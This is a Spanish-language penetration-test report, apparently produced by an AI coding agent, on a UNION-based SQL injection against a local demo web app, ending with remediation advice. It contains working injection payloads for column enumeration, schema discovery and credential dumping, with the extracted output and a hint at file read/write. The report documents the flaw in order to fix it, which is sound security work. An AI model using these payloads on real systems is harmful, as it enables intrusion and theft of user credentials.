# Informe de Auditoría de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-21T07:54:52  
**Analista:** GitHub Copilot CLI (claude-sonnet-4.6)  
**Tipo de análisis:** SQL Injection (simple/manual)

---

## Resumen Ejecutivo

Se identificó y explotó exitosamente una vulnerabilidad de tipo **SQL Injection** en el parámetro `id` del endpoint principal de la aplicación. La vulnerabilidad permite extraer toda la información de la base de datos, incluyendo credenciales de usuarios en texto plano.

---

## Información del Sistema

| Campo | Valor |
|-------|-------|
| URL objetivo | http://web.dev.local:8083/ |
| Parámetro vulnerable | `id` (GET) |
| SGBD | MariaDB 10.11.14-MariaDB-ubu2204 |
| Base de datos activa | `sqli_demo` |
| Usuario DB | `root@172.18.0.3` |
| Directorio de datos | `/var/lib/mysql/` |

---

## Vulnerabilidad Detectada

### SQL Injection - UNION-based (GET `id`)

**Severidad:** 🔴 CRÍTICA  
**CVE de referencia:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)

**Descripción:**  
El parámetro `id` se inserta directamente en la consulta SQL sin sanitización ni uso de sentencias preparadas (prepared statements). La aplicación refleja los errores de MariaDB en la respuesta HTTP, facilitando la explotación.

**Evidencia del error:**
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
check the manual that corresponds to your MariaDB server version for the right 
syntax to use near ''1''' at line 1 in /var/www/html/low.php:11
```

El archivo fuente es `/var/www/html/low.php`, línea 11.

---

## Explotación

### Paso 1 - Confirmación de inyección

```
GET /?id=1'&Submit=Submit
→ Error de sintaxis SQL (confirmado)
```

### Paso 2 - Determinación del número de columnas

```
GET /?id=1' ORDER BY 2-- -   → OK (2 columnas)
GET /?id=1' ORDER BY 3-- -   → Error: Unknown column '3' in 'ORDER BY'
```

### Paso 3 - Identificación de columnas visibles

```
GET /?id=' UNION SELECT 1,2-- -
→ First name: 1 / Surname: 2  (ambas columnas son visibles)
```

### Paso 4 - Extracción de metadatos

```
GET /?id=' UNION SELECT database(),version()-- -
→ DB: sqli_demo / Version: 10.11.14-MariaDB-ubu2204

GET /?id=' UNION SELECT user(),@@datadir-- -
→ User: root@172.18.0.3 / DataDir: /var/lib/mysql/

GET /?id=' UNION SELECT GROUP_CONCAT(schema_name),2 FROM information_schema.schemata-- -
→ Bases de datos: information_schema, sqli_demo, sys, mysql, performance_schema
```

### Paso 5 - Enumeración de tablas y columnas

```
Tablas en sqli_demo: users

Columnas de users: user_id, first_name, last_name, username, password, email
```

### Paso 6 - Extracción de credenciales

```
GET /?id=' UNION SELECT GROUP_CONCAT(user_id,'|',username,'|',password,'|',email SEPARATOR '\n'),2 FROM sqli_demo.users-- -
```

**Resultado (8 usuarios extraídos):**

| user_id | username | password | email |
|---------|----------|----------|-------|
| 1 | admin | password123 | admin@example.com |
| 2 | jsmith | secret456 | jane@example.com |
| 3 | bjohnson | mypass789 | bob@example.com |
| 4 | awilliams | qwerty123 | alice@example.com |
| 5 | cbrown | password | charlie@example.com |
| 6 | ddavis | secure123 | diana@example.com |
| 7 | emiller | hackme | eve@example.com |
| 8 | fwilson | admin123 | frank@example.com |

> ⚠️ Las contraseñas se almacenan en **texto plano** (sin hashing).

---

## Impacto

- **Confidencialidad:** ALTO - Acceso completo a todos los datos de la BD, incluyendo credenciales.
- **Integridad:** ALTO - El usuario de BD es `root`, permitiendo INSERT/UPDATE/DELETE.
- **Disponibilidad:** ALTO - El usuario `root` podría DROP tablas o bases de datos.
- **Acceso al sistema:** POSIBLE - Con `root` en MariaDB podría intentarse `LOAD_FILE` / `INTO OUTFILE`.

---

## Recomendaciones

1. **Usar Prepared Statements / Parametrized Queries:**
   ```php
   $stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->bind_param("i", $id);
   $stmt->execute();
   ```

2. **Validar y filtrar entradas:** Verificar que el parámetro `id` sea un entero antes de usarlo.

3. **Deshabilitar verbose errors en producción:** No mostrar errores de SQL al usuario.

4. **Usar un usuario de BD con mínimos privilegios** (no `root`).

5. **Almacenar contraseñas con hashing seguro** (bcrypt, argon2) en lugar de texto plano.

6. **Implementar WAF** para detectar payloads de inyección SQL.

---

## Conclusión

La aplicación en http://web.dev.local:8083 es **críticamente vulnerable** a SQL Injection en el parámetro `id`. Se logró extraer completamente la base de datos `sqli_demo`, incluyendo los 8 usuarios con sus contraseñas en texto plano. La combinación de inyección directa, errores verbosos y usuario root en la base de datos representa un riesgo máximo.
